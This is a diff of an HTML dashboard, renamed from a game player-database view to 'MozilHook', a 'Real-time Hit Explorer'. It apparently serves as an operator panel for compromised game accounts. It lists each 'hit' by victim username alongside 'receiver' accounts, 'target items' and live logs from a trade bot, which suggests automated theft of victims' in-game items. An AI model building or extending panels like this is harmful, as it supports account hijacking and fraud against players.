@@ -3,111 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M4GIX HUB</title>
+    <title>MozilHook Dashboard</title>
+    <script src="/socket.io/socket.io.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        body { background-color: #0b0f1a; color: #e2e8f0; font-family: 'Inter', sans-serif; font-size: 11px; }
-        .card { background-color: #111827; border: 1px solid #1f2937; position: relative; overflow: hidden; }
-        .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #3b82f6; opacity: 0.5; }
-        .search-input { background: #0f172a; border: 1px solid #334155; }
-        .btn-danger { background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.2); color: #ef4444; }
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: #374151; }
+        body { background-color: #0f172a; color: white; }
+        .hit-card { background: #1e293b; border-top: 4px solid #3b82f6; transition: all 0.3s; }
+        .hit-card:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.4); }
+        .log-entry { font-family: 'Consolas', monospace; font-size: 0.75rem; border-bottom: 1px solid #334155; padding: 2px 0; }
+        .receiver-tag { background: #334155; color: #94a3b8; padding: 1px 6px; border-radius: 4px; font-size: 0.7rem; margin-right: 4px; }
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 10px; }
     </style>
 </head>
-<body class="p-4">
-    <header class="flex flex-wrap justify-between items-center gap-4 mb-4">
-        <div class="flex items-center gap-4">
-            <h1 class="text-xl font-black text-blue-500 italic uppercase">M4GIX <span class="text-white">DB</span></h1>
-            <button onclick="dbAction('clear')" class="btn-danger px-3 py-1 text-[9px] font-black uppercase rounded">Clear DB</button>
+<body class="p-6">
+    <header class="mb-10 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 border-b border-slate-800 pb-6">
+        <div>
+            <h1 class="text-3xl font-black tracking-tight text-white">MOZIL<span class="text-blue-500">HOOK</span></h1>
+            <p class="text-slate-400 text-sm">Real-time Hit Explorer</p>
         </div>
-        <input type="text" id="global-search" oninput="applyFilter()" placeholder="Filter..." class="search-input flex-1 max-w-xl px-4 py-1.5 rounded text-xs outline-none">
-        <div class="bg-emerald-600/10 border border-emerald-500/20 px-4 py-1.5 rounded">
-            <span id="total-income-all" class="text-sm font-black text-emerald-400">$0/s</span>
+        <div id="status" class="flex items-center gap-2 px-3 py-1 rounded-full bg-green-500/10 text-green-400 text-xs font-bold border border-green-500/50">
+            <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span> SYSTEM LIVE
         </div>
     </header>
 
-    <main id="main-display"></main>
+    <div id="hits-container" class="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
+        </div>
 
     <script>
-        let allPlayers = [];
-        let onlinePlayers = [];
+        const socket = io();
+        const container = document.getElementById('hits-container');
 
-        const COLORS = {
-            mut: { 'Gold': '#FFDE59', 'Diamond': '#25C4FE', 'Bloodrot': '#8A3B3C', 'Rainbow': '#ff00fb', 'Candy': '#ff46f6', 'Lava': '#ff7700', 'Galaxy': '#aa3cff', 'Radioactive': '#68f500', 'Cursed': '#f53838', 'Shiny': '#b4ff5e', 'YinYang': '#ffffff' },
-            rarity: { 'Common': '#ffffff', 'Rare': '#3b82f6', 'Epic': '#a855f7', 'Legendary': '#f59e0b', 'Mythic': '#ef4444', 'Secret': '#10b981' }
-        };
+        // Initial Load
+        fetch('/api/hits')
+            .then(res => res.json())
+            .then(hits => hits.forEach(renderHit));
 
-        const fM = (v) => {
-            if (!v) return "0";
-            if (v >= 1e12) return (v/1e12).toFixed(1) + "T";
-            if (v >= 1e9) return (v/1e9).toFixed(1) + "B";
-            if (v >= 1e6) return (v/1e6).toFixed(1) + "M";
-            if (v >= 1e3) return (v/1e3).toFixed(1) + "K";
-            return v.toFixed(0);
-        };
+        function renderHit(hit) {
+            let card = document.getElementById(`hit-${hit.hitId}`);
+            
+            const content = `
+                <div class="flex justify-between items-center mb-4">
+                    <span class="text-[10px] font-mono text-slate-500 bg-slate-900 px-2 py-1 rounded">ID: ${hit.hitId}</span>
+                    <span class="text-[10px] text-slate-400">${new Date(hit.timestamp).toLocaleString()}</span>
+                </div>
 
-        const ws = new WebSocket(`${window.location.protocol==='https:'?'wss':'ws'}://${window.location.host}/?username=dashboard`);
-        ws.onmessage = (e) => {
-            const payload = JSON.parse(e.data);
-            if (payload.type === 'REFRESH') {
-                allPlayers = payload.data;
-                onlinePlayers = payload.online || [];
-                applyFilter();
+                <div class="mb-4">
+                    <h2 class="text-2xl font-bold text-white leading-tight">${hit.displayName || hit.username}</h2>
+                    <p class="text-blue-400 text-sm font-medium">@${hit.username}</p>
+                </div>
+
+                <div class="mb-4">
+                    <p class="text-[10px] uppercase tracking-widest text-slate-500 font-bold mb-2">Available Receivers</p>
+                    <div class="flex flex-wrap gap-1">
+                        ${hit.receivers && hit.receivers.length > 0 
+                            ? hit.receivers.map(r => `<span class="receiver-tag">${r}</span>`).join('') 
+                            : '<span class="text-slate-600 text-xs italic">No receivers listed</span>'}
+                    </div>
+                </div>
+                
+                <div class="mb-4">
+                    <p class="text-[10px] uppercase tracking-widest text-slate-500 font-bold mb-2">Target Items (${hit.items.length})</p>
+                    <div class="text-xs text-slate-300 h-28 overflow-y-auto bg-slate-900/50 p-3 rounded-lg border border-slate-700/50">
+                        ${hit.items.map(i => `<div class="mb-1 border-b border-slate-800 pb-1 text-slate-400">${i}</div>`).join('')}
+                    </div>
+                </div>
+
+                <div>
+                    <p class="text-[10px] uppercase tracking-widest text-slate-500 font-bold mb-2">Live Trade Logs</p>
+                    <div id="logs-${hit.hitId}" class="h-40 overflow-y-auto bg-black rounded-lg p-3 border border-slate-800">
+                        ${hit.logs && hit.logs.length > 0 
+                            ? hit.logs.map(l => `<div class="log-entry text-green-500/90">${l}</div>`).join('') 
+                            : '<div class="text-slate-700 italic text-xs">Awaiting bot feedback...</div>'}
+                    </div>
+                </div>
+            `;
+
+            if (card) {
+                card.innerHTML = content;
+            } else {
+                card = document.createElement('div');
+                card.id = `hit-${hit.hitId}`;
+                card.className = 'hit-card p-6 rounded-2xl shadow-xl';
+                card.innerHTML = content;
+                container.prepend(card);
             }
-        };
-
-        async function dbAction(type, name = null) {
-            if (type === 'clear' && !confirm("Vider la DB ?")) return;
-            await fetch(type === 'clear' ? '/api/clear' : `/api/remove?username=${name}`);
+            
+            // Scroll logs to bottom
+            const logBox = document.getElementById(`logs-${hit.hitId}`);
+            if (logBox) logBox.scrollTop = logBox.scrollHeight;
         }
 
-        function applyFilter() {
-            const q = document.getElementById('global-search').value.toLowerCase();
-            const filtered = allPlayers.filter(p => (p.Name || "").toLowerCase().includes(q) || (p.DisplayName || "").toLowerCase().includes(q));
-            renderCards(filtered);
-        }
+        socket.on('newHit', renderHit);
+        socket.on('updateHit', renderHit);
 
-        function renderCards(players) {
-            let gIncome = 0;
-            const html = players.map(p => {
-                const items = p.Brainrots || [];
-                const pInc = items.reduce((s, b) => s + (b.Income || 0), 0);
-                gIncome += pInc;
-                const isOnline = onlinePlayers.includes(p.Name);
-
-                return `
-                <div class="card p-3 rounded flex flex-col gap-2 ${isOnline ? 'ring-1 ring-emerald-500' : 'opacity-70'}">
-                    <div class="flex justify-between border-b border-slate-800 pb-2">
-                        <div>
-                            <div class="font-black text-blue-400 uppercase truncate w-32">${p.DisplayName || '???'}</div>
-                            <div class="text-[8px] text-slate-600">@${p.Name || 'n/a'}</div>
-                        </div>
-                        <div class="text-right">
-                            <button onclick="dbAction('remove', '${p.Name}')" class="text-slate-700 hover:text-red-500 font-bold">✕</button>
-                            <div class="text-emerald-400 font-black">$${fM(pInc)}</div>
-                        </div>
-                    </div>
-                    <div class="space-y-1 max-h-48 overflow-y-auto pr-1">
-                        ${items.map(b => `
-                            <div class="bg-black/20 p-1.5 rounded border border-slate-800/50">
-                                <div class="flex justify-between text-[9px] font-bold">
-                                    <span class="text-slate-300">${b.Name}</span>
-                                    <span class="text-emerald-500">$${fM(b.Income)}</span>
-                                </div>
-                                <div class="flex gap-1 mt-0.5 text-[7px] font-black uppercase">
-                                    <span style="color:${COLORS.mut[b.Mutation] || '#94a3b8'}">${b.Mutation}</span>
-                                    <span style="color:${COLORS.rarity[b.Rarity] || '#fff'}">${b.Rarity}</span>
-                                </div>
-                            </div>
-                        `).join('')}
-                    </div>
-                </div>`;
-            }).join('');
-            document.getElementById('total-income-all').innerText = `$${fM(gIncome)}/s`;
-            document.getElementById('main-display').innerHTML = `<div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 xl:grid-cols-6 gap-3">${html}</div>`;
-        }
+        socket.on('disconnect', () => {
+            const status = document.getElementById('status');
+            status.className = "flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 text-red-400 text-xs font-bold border border-red-500/50";
+            status.innerHTML = '<span class="w-2 h-2 bg-red-500 rounded-full"></span> CONNECTION LOST';
+        });
     </script>
 </body>
 </html>
